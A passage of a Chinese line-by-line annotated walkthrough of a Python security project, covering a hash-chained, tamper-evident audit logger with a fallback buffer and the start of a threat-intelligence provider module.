| 81 | 日志记录：输出运行状态、调试信息或异常线索。 | `                self.logger.addHandler(file_handler)` |
| 82 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except OSError as exc:` |
| 83 | 注释：解释下面或当前这段代码的设计意图。 | `                # 文件 handler 打不开不应崩溃` |
| 84 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logging.getLogger(__name__).error(` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "[SecurityLogger] 主日志 handler 打开失败: %s", exc` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 87 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 88 | 日志记录：输出运行状态、调试信息或异常线索。 | `            console_handler = logging.StreamHandler()` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `            console_handler.setFormatter(` |
| 90 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logging.Formatter("[%(asctime)s] %(levelname)s - %(message)s")` |
| 91 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 92 | 日志记录：输出运行状态、调试信息或异常线索。 | `            self.logger.addHandler(console_handler)` |
| 93 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 94 | 注释：解释下面或当前这段代码的设计意图。 | `        # 避免同一条日志被 Flask root logger 再次打印` |
| 95 | 日志记录：输出运行状态、调试信息或异常线索。 | `        self.logger.propagate = False` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 函数定义：声明 `_restore_last_hash` 的输入、处理逻辑和返回结果。 | `    def _restore_last_hash(self) -> None:` |
| 98 | 文档字符串：说明当前模块、类或函数的职责。 | `        """从既有 security.log 末行恢复链尾 hash，保证跨重启链连续。"""` |
| 99 | 条件判断：满足条件时进入对应分支。 | `        if not self.enable_integrity:` |
| 100 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_hash = ""` |
| 102 | 条件判断：满足条件时进入对应分支。 | `        if not os.path.exists(self.log_file):` |
| 103 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 104 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 105 | 上下文管理：自动管理资源打开与释放。 | `            with open(self.log_file, "r", encoding="utf-8") as f:` |
| 106 | 循环：逐个处理集合或迭代器中的元素。 | `                for raw_line in reversed(f.readlines()):` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    line = raw_line.strip()` |
| 108 | 条件判断：满足条件时进入对应分支。 | `                    if not line:` |
| 109 | 继续循环：跳过本轮剩余逻辑。 | `                        continue` |
| 110 | 异常保护：尝试执行可能失败的逻辑。 | `                    try:` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        entry = json.loads(line)` |
| 112 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                    except json.JSONDecodeError:` |
| 113 | 继续循环：跳过本轮剩余逻辑。 | `                        continue` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    integrity = entry.get("integrity") or {}` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    h = integrity.get("hash")` |
| 116 | 条件判断：满足条件时进入对应分支。 | `                    if isinstance(h, str) and h:` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        self._last_hash = h` |
| 118 | 返回结果：把处理后的值交回调用方。 | `                        return` |
| 119 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except OSError:` |
| 120 | 注释：解释下面或当前这段代码的设计意图。 | `            # 日志不可读时保持默认 genesis，不阻断主流程` |
| 121 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 122 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 123 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 124 | 注释：解释下面或当前这段代码的设计意图。 | `    # 哈希工具` |
| 125 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 126 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 127 | 函数定义：声明 `_hash` 的输入、处理逻辑和返回结果。 | `    def _hash(text: str) -> str:` |
| 128 | 文档字符串：说明当前模块、类或函数的职责。 | `        """SHA-256 前 16 位，作为简短可读的哈希。"""` |
| 129 | 返回结果：把处理后的值交回调用方。 | `        return hashlib.sha256(text.encode("utf-8")).hexdigest()[:16]` |
| 130 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 131 | 函数定义：声明 `_compute_chain_hash` 的输入、处理逻辑和返回结果。 | `    def _compute_chain_hash(self, canonical_json: str) -> str:` |
| 132 | 文档字符串：说明当前模块、类或函数的职责。 | `        """基于上一条哈希 + 当前条目 canonical JSON 计算链式哈希。"""` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        prev = self._last_hash or "genesis"` |
| 134 | 返回结果：把处理后的值交回调用方。 | `        return self._hash(f"{prev}:{canonical_json}")` |
| 135 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 136 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 137 | 函数定义：声明 `_canonicalize` 的输入、处理逻辑和返回结果。 | `    def _canonicalize(event: Dict[str, Any]) -> str:` |
| 138 | 文档字符串：说明当前模块、类或函数的职责。 | `        """排序 key 的 canonical JSON 序列化，保证哈希可复现。"""` |
| 139 | 返回结果：把处理后的值交回调用方。 | `        return json.dumps(` |
| 140 | 代码语句：参与当前文件的业务流程或数据处理。 | `            event,` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ensure_ascii=False,` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            sort_keys=True,` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            separators=(",", ":"),` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 145 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 146 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 147 | 注释：解释下面或当前这段代码的设计意图。 | `    # 写入内部` |
| 148 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 149 | 函数定义：声明 `_write` 的输入、处理逻辑和返回结果。 | `    def _write(self, event: Dict[str, Any]) -> Dict[str, Any]:` |
| 150 | 文档字符串：说明当前模块、类或函数的职责。 | `        """落盘一条事件；必要时补 integrity 字段，并在失败时写入本地缓冲。` |
| 151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 152 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 153 | 代码语句：参与当前文件的业务流程或数据处理。 | `            实际被写入（含 integrity 字段）的事件字典。` |
| 154 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 155 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 156 | 条件判断：满足条件时进入对应分支。 | `            if self.enable_integrity:` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                canonical = self._canonicalize(event)` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                h = self._compute_chain_hash(canonical)` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                event["integrity"] = {` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "hash": h,` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "prev_hash": self._last_hash or "genesis",` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "algorithm": "sha256",` |
| 163 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self._last_hash = h` |
| 165 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            line = json.dumps(event, ensure_ascii=False)` |
| 167 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 168 | 日志记录：输出运行状态、调试信息或异常线索。 | `                self.logger.info(line)` |
| 169 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001 - 写入失败不得拖垮主流程` |
| 170 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._buffer_write(line, exc)` |
| 171 | 返回结果：把处理后的值交回调用方。 | `            return event` |
| 172 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 173 | 函数定义：声明 `_buffer_write` 的输入、处理逻辑和返回结果。 | `    def _buffer_write(self, line: str, exc: BaseException) -> None:` |
| 174 | 文档字符串：说明当前模块、类或函数的职责。 | `        """主日志写入失败时的本地缓冲降级，避免丢失关键审计数据。"""` |
| 175 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 176 | 上下文管理：自动管理资源打开与释放。 | `            with open(self.buffer_file, "a", encoding="utf-8") as f:` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `                f.write(line + "\n")` |
| 178 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logging.getLogger(__name__).error(` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[SecurityLogger] 主日志写入失败，已写入缓冲文件 %s: %s",` |
| 180 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.buffer_file,` |
| 181 | 代码语句：参与当前文件的业务流程或数据处理。 | `                exc,` |
| 182 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 183 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except OSError:` |
| 184 | 注释：解释下面或当前这段代码的设计意图。 | `            # 连兜底文件也打不开，只能退化到 stderr 记录` |
| 185 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logging.getLogger(__name__).error(` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[SecurityLogger] 主日志与缓冲文件均不可写，丢弃一条记录: %s",` |
| 187 | 代码语句：参与当前文件的业务流程或数据处理。 | `                line,` |
| 188 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 189 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 190 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 191 | 注释：解释下面或当前这段代码的设计意图。 | `    # 对外写入 API` |
| 192 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 193 | 函数定义：声明 `log_event` 的输入、处理逻辑和返回结果。 | `    def log_event(` |
| 194 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        event_type: str,` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level: str,` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        details: Optional[Dict[str, Any]] = None,` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        source_ip: str = "",` |
| 199 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        confidence: float = 0.0,` |
| 200 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Dict[str, Any]:` |
| 201 | 文档字符串：说明当前模块、类或函数的职责。 | `        """记录安全事件（检测结果 / 威胁情报命中 等）。"""` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        event = {` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "timestamp": datetime.now().isoformat(),` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "event_type": event_type,` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "level": level,` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "source_ip": source_ip,` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "confidence": float(confidence),` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "details": details or {},` |
| 209 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 210 | 返回结果：把处理后的值交回调用方。 | `        return self._write(event)` |
| 211 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 212 | 函数定义：声明 `log_response` 的输入、处理逻辑和返回结果。 | `    def log_response(self, action: str, target: str, result: str) -> Dict[str, Any]:` |
| 213 | 文档字符串：说明当前模块、类或函数的职责。 | `        """记录响应动作（封禁 / 解封 / 隔离 / 告警推送等）。"""` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        event = {` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "timestamp": datetime.now().isoformat(),` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "event_type": "response",` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "action": action,` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "target": target,` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "result": result,` |
| 220 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 221 | 返回结果：把处理后的值交回调用方。 | `        return self._write(event)` |
| 222 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 223 | 函数定义：声明 `log_system` 的输入、处理逻辑和返回结果。 | `    def log_system(self, message: str, level: str = "info") -> Dict[str, Any]:` |
| 224 | 文档字符串：说明当前模块、类或函数的职责。 | `        """记录系统级事件（启动 / 关闭 / 模型加载失败等）。"""` |
| 225 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        event = {` |
| 226 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "timestamp": datetime.now().isoformat(),` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "event_type": "system",` |
| 228 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "level": level,` |
| 229 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "message": message,` |
| 230 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 231 | 返回结果：把处理后的值交回调用方。 | `        return self._write(event)` |
| 232 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 233 | 函数定义：声明 `log_model_governance` 的输入、处理逻辑和返回结果。 | `    def log_model_governance(` |
| 234 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self, action: str, details: Optional[Dict[str, Any]] = None` |
| 235 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Dict[str, Any]:` |
| 236 | 文档字符串：说明当前模块、类或函数的职责。 | `        """模型生命周期审计（切换 / 回滚 / 加载失败等），对齐 AuditEvent 类语义。"""` |
| 237 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload = {"action": action, **(details or {})}` |
| 238 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        event = {` |
| 239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "timestamp": datetime.now().isoformat(),` |
| 240 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "event_type": "model_governance",` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "level": "info",` |
| 242 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "resource_type": "ml_model",` |
| 243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "details": payload,` |
| 244 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 245 | 返回结果：把处理后的值交回调用方。 | `        return self._write(event)` |
| 246 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 247 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 248 | 注释：解释下面或当前这段代码的设计意图。 | `    # 完整性校验 API` |
| 249 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 250 | 函数定义：声明 `verify_integrity` 的输入、处理逻辑和返回结果。 | `    def verify_integrity(self, log_file: Optional[str] = None) -> Dict[str, Any]:` |
| 251 | 文档字符串：说明当前模块、类或函数的职责。 | `        """重放哈希链，检查主日志文件是否被篡改或删除行。` |
| 252 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 253 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 254 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            log_file: 待校验的日志文件，默认 \`logs/security.log\`。` |
| 255 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 256 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 257 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dict: \`valid\` / \`total_lines\` / \`invalid_lines\` 三字段。` |
| 258 | 代码语句：参与当前文件的业务流程或数据处理。 | `            当 \`enable_integrity=False\` 时直接返回 valid=True。` |
| 259 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 260 | 条件判断：满足条件时进入对应分支。 | `        if not self.enable_integrity:` |
| 261 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "valid": True,` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "total_lines": 0,` |
| 264 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "invalid_lines": [],` |
| 265 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "message": "完整性校验未启用",` |
| 266 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 267 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        path = log_file or self.log_file` |
| 269 | 条件判断：满足条件时进入对应分支。 | `        if not os.path.exists(path):` |
| 270 | 注释：解释下面或当前这段代码的设计意图。 | `            # 尚无审计落盘时视为可接受状态，避免首次启动巡检误报 critical。` |
| 271 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 272 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "valid": True,` |
| 273 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "total_lines": 0,` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "invalid_lines": [],` |
| 275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "message": "日志文件不存在（无记录可校验）",` |
| 276 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 277 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 278 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        prev_hash = "genesis"` |
| 279 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        line_count = 0` |
| 280 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        invalid_lines: List[str] = []` |
| 281 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 282 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 283 | 上下文管理：自动管理资源打开与释放。 | `            with open(path, "r", encoding="utf-8") as f:` |
| 284 | 循环：逐个处理集合或迭代器中的元素。 | `                for line_num, raw_line in enumerate(f, 1):` |
| 285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    line = raw_line.strip()` |
| 286 | 条件判断：满足条件时进入对应分支。 | `                    if not line:` |
| 287 | 继续循环：跳过本轮剩余逻辑。 | `                        continue` |
| 288 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    line_count += 1` |
| 289 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 290 | 异常保护：尝试执行可能失败的逻辑。 | `                    try:` |
| 291 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        entry = json.loads(line)` |
| 292 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                    except json.JSONDecodeError:` |
| 293 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        invalid_lines.append(f"行 {line_num}: JSON 解析失败")` |
| 294 | 继续循环：跳过本轮剩余逻辑。 | `                        continue` |
| 295 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 296 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    integrity = entry.get("integrity", {})` |
| 297 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    expected_hash = integrity.get("hash", "")` |
| 298 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    entry_prev = integrity.get("prev_hash", "")` |
| 299 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    effective_prev = prev_hash` |
| 300 | 注释：解释下面或当前这段代码的设计意图。 | `                    # 兼容历史日志：旧版本在跨重启时可能把 prev_hash 重置为 genesis。` |
| 301 | 注释：解释下面或当前这段代码的设计意图。 | `                    # 校验时将其视为“新分段起点”，避免旧数据长期污染巡检结果。` |
| 302 | 条件判断：满足条件时进入对应分支。 | `                    if entry_prev == "genesis" and prev_hash != "genesis":` |
| 303 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        effective_prev = "genesis"` |
| 304 | 条件分支：前面条件不满足时继续判断。 | `                    elif entry_prev != prev_hash:` |
| 305 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        invalid_lines.append(` |
| 306 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            f"行 {line_num}: 哈希链断裂 "` |
| 307 | 函数调用：执行已有函数/方法完成当前步骤。 | `                            f"(期望 prev={prev_hash}, 实际 prev={entry_prev})"` |
| 308 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        )` |
| 309 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 310 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    body = {k: v for k, v in entry.items() if k != "integrity"}` |
| 311 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    canonical = self._canonicalize(body)` |
| 312 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    recomputed = self._hash(f"{effective_prev}:{canonical}")` |
| 313 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 314 | 条件判断：满足条件时进入对应分支。 | `                    if recomputed != expected_hash:` |
| 315 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        invalid_lines.append(` |
| 316 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            f"行 {line_num}: 哈希不匹配 "` |
| 317 | 函数调用：执行已有函数/方法完成当前步骤。 | `                            f"(期望={expected_hash}, 实际={recomputed})"` |
| 318 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        )` |
| 319 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 320 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    prev_hash = expected_hash or prev_hash` |
| 321 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except OSError as exc:` |
| 322 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 323 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "valid": False,` |
| 324 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "total_lines": line_count,` |
| 325 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "invalid_lines": [f"日志文件读取失败: {exc}"],` |
| 326 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 327 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 328 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 329 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "valid": len(invalid_lines) == 0,` |
| 330 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "total_lines": line_count,` |
| 331 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "invalid_lines": invalid_lines,` |
| 332 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 333 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 334 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 335 | 注释：解释下面或当前这段代码的设计意图。 | `    # 缓冲区维护 API（供运维巡检使用）` |
| 336 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 337 | 函数定义：声明 `has_buffered` 的输入、处理逻辑和返回结果。 | `    def has_buffered(self) -> bool:` |
| 338 | 文档字符串：说明当前模块、类或函数的职责。 | `        """是否存在未回写的缓冲文件（通常发生在主日志不可写时）。"""` |
| 339 | 返回结果：把处理后的值交回调用方。 | `        return os.path.exists(self.buffer_file) and os.path.getsize(self.buffer_file) > 0` |
| 340 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 341 | 函数定义：声明 `drain_buffer` 的输入、处理逻辑和返回结果。 | `    def drain_buffer(self) -> int:` |
| 342 | 文档字符串：说明当前模块、类或函数的职责。 | `        """尝试将缓冲文件中的记录回写到主日志，成功后清空缓冲文件。` |
| 343 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 344 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 345 | 代码语句：参与当前文件的业务流程或数据处理。 | `            回写的行数；主日志仍不可写则保持缓冲文件原状并返回 0。` |
| 346 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 347 | 条件判断：满足条件时进入对应分支。 | `        if not self.has_buffered():` |
| 348 | 返回结果：把处理后的值交回调用方。 | `            return 0` |
| 349 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 350 | 上下文管理：自动管理资源打开与释放。 | `            with open(self.buffer_file, "r", encoding="utf-8") as f:` |
| 351 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                lines: Iterable[str] = list(f)` |
| 352 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            count = 0` |
| 353 | 循环：逐个处理集合或迭代器中的元素。 | `            for raw in lines:` |
| 354 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                line = raw.strip()` |
| 355 | 条件判断：满足条件时进入对应分支。 | `                if not line:` |
| 356 | 继续循环：跳过本轮剩余逻辑。 | `                    continue` |
| 357 | 日志记录：输出运行状态、调试信息或异常线索。 | `                self.logger.info(line)` |
| 358 | 代码语句：参与当前文件的业务流程或数据处理。 | `                count += 1` |
| 359 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.remove(self.buffer_file)` |
| 360 | 返回结果：把处理后的值交回调用方。 | `            return count` |
| 361 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except OSError as exc:` |
| 362 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logging.getLogger(__name__).error(` |
| 363 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[SecurityLogger] 缓冲回写失败: %s", exc` |
| 364 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 365 | 返回结果：把处理后的值交回调用方。 | `            return 0` |

## `src/collectors/__init__.py`

- 类型：后端采集
- 行数：1

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 代码语句：参与当前文件的业务流程或数据处理。 | `﻿"""Package initializer."""` |

## `src/collectors/ioc_providers.py`

- 类型：后端采集
- 行数：265

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `外部威胁情报 Provider 接口与实现。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `- 已接入：AbuseIPDB（IP）、VirusTotal（IP / 域名 / URL / 文件哈希）` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `- 占位：Spamhaus、PhishTank、OpenPhish、NVD、CNVD（未配置时 \`\`not_configured\`\` 降级）` |
| 6 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 7 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import base64` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import re` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from abc import ABC, abstractmethod` |
| 13 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, Optional, Tuple` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import requests` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 注释：解释下面或当前这段代码的设计意图。 | `#: 与 threat_intel 中域名校验保持一致风格（子集）` |
